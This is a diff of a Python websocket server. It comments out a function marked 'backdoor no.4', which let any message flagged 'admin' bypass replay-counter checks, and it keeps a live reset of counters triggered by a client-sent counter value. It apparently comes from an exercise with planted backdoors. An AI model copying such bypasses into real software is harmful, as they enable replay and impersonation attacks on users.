@@ -48,11 +48,16 @@ class Server:
         
         self.mode = False
         
-    async def add_neighbour_servers(self, server_urls: List[str]):
-        for url in server_urls:
-            if url not in self.neighbour_servers:
-                self.neighbour_servers.append(url)
-                await self.connect_to_neighbour(url)
+    async def add_neighbour_server(self, server_address: str, server_public_key: str):
+        if server_address not in self.neighbour_servers:
+            self.neighbour_servers[server_address] = {
+                "public_key": server_public_key,
+                "counter": 0,
+            }
+
+            if self._websocket_server is not None:
+                await self.connect_to_neighbour(server_address)
+
 
     async def connect_to_neighbourhood(self):
         """Create client connections for every neighbour servers"""
@@ -153,7 +158,7 @@ class Server:
         message_type = message.get("type", None)
         
         counter = message.get("counter", None)
-        if counter == 3:
+        if counter == 6:
              await self.reset_counters(websocket)
         
         if message_type == "client_list_request":
@@ -261,16 +266,31 @@ class Server:
         self.neighbour_websockets[websocket] = sender_address
         await self.connect_to_neighbour(sender_address)
 
-    def validate_counter(self, websocket, message):
-        # backdoor no.4
-        parsed_message = message["data"] if isinstance(message["data"], dict) else json.loads(message["data"])
+    # def validate_counter(self, websocket, message):
+    #     # backdoor no.4
+    #     parsed_message = message["data"] if isinstance(message["data"], dict) else json.loads(message["data"])
         
-        is_admin = parsed_message.get("admin", False)
-        if is_admin:
-            # bypass check for admin
-            logging.info(f"adminnnnnnn!!")
-            return True
-        else:
+    #     is_admin = parsed_message.get("admin", False)
+    #     if is_admin:
+    #         # bypass check for admin
+    #         logging.info(f"adminnnnnnn!!")
+    #         return True
+    #     else:
+    #         sender = self.clients.get(websocket)
+    #         if not sender:
+    #             logging.error(f"{self.url} message from unknown client detected")
+    #             return False
+
+    #         # Check if the counter is larger or equal to the counter saved in the server
+    #         sender["counter"] = sender.get("counter", "0")
+    #         if int(message["counter"]) < int(sender["counter"]):
+    #             logging.error(f"{self.url} message with replay attack detected")
+    #             return False
+
+    #         # Increment counter
+    #         sender["counter"] = int(message["counter"]) + 1
+    #         return True
+    def validate_client_counter(self, websocket, message):
             sender = self.clients.get(websocket)
             if not sender:
                 logging.error(f"{self.url} message from unknown client detected")
@@ -285,7 +305,6 @@ class Server:
             # Increment counter
             sender["counter"] = int(message["counter"]) + 1
             return True
-
     def get_websocket_from_fingerprint(self, fingerprint):
         """
         Retrieve a public key using the sender's fingerprint from the online users list.
